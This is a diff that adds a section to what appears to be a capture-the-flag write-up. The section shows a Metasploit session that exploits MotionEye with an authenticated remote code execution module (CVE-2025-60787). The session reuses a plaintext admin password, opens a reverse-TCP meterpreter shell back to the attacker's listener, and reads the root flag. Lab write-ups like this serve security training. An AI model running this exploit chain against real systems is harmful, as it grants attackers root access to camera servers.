@@ -73,3 +73,47 @@ It exposes the MotionEye CCTV management app, and the hint suggests we can reuse
 admin / X1l9fx1ZjS7RZb
 ```
 
+```
+msf > search exploit/linux/http/motioneye_auth_rce_cve_2025_60787
+
+Matching Modules
+================
+
+   #  Name                                                  Disclosure Date  Rank       Check  Description
+   -  ----                                                  ---------------  ----       -----  -----------
+   0  exploit/linux/http/motioneye_auth_rce_cve_2025_60787  2025-09-09       excellent  Yes    Remote Code Execution Vulnerability in MotionEye Frontend (CVE-2025-60787)
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
+
+msf > use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
+[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
+msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set RPORT 8765
+RPORT => 8765
+msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set PASSWORD X1l9fx1ZjS7RZb
+PASSWORD => X1l9fx1ZjS7RZb
+msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set LHOST tun0
+LHOST => tun0
+msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > run
+[*] Started reverse TCP handler on 10.10.15.4:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Detected version 0.43.1b4, which is vulnerable
+[*] Adding malicious camera...
+[+] Camera successfully added
+[*] Setting up exploit...
+[+] Exploit setup complete
+[*] Triggering exploit...
+[+] Exploit triggered, waiting for session...
+[*] Sending stage (3090404 bytes) to 10.129.2.184
+[*] Meterpreter session 1 opened (10.10.15.4:4444 -> 10.129.2.184:35150) at 2026-03-08 16:20:12 +0545
+[*] Removing camera
+[+] Camera removed successfully
+
+meterpreter > getuid
+Server username: root
+meterpreter > cat /root/root.txt
+f040655fd2935c56b86c8163de21a8bf
+```
+
